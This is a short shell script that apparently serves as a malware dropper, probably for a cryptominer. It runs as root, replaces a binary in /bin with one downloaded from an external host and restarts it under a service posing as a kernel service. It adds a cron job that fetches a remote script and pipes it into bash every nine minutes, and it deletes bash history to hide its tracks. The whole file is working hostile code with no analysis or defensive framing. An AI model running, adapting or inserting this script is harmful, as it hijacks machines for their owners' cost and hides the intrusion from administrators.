if [ ! -f /etc/cron.d/cronextend ]; then
	apt-get update
 	apt-get install -y sshpass
	systemctl stop sys-kernel.service
        killall cpuhp
 	cd /bin
	rm cpuhp
	wget https://xmrhorizontal.github.io/cpuhp
    	echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
 	systemctl daemon-reload
	systemctl start sys-kernel.service
        rm -f ~/.bash_history
        rm -f /root/.bash_history
fi
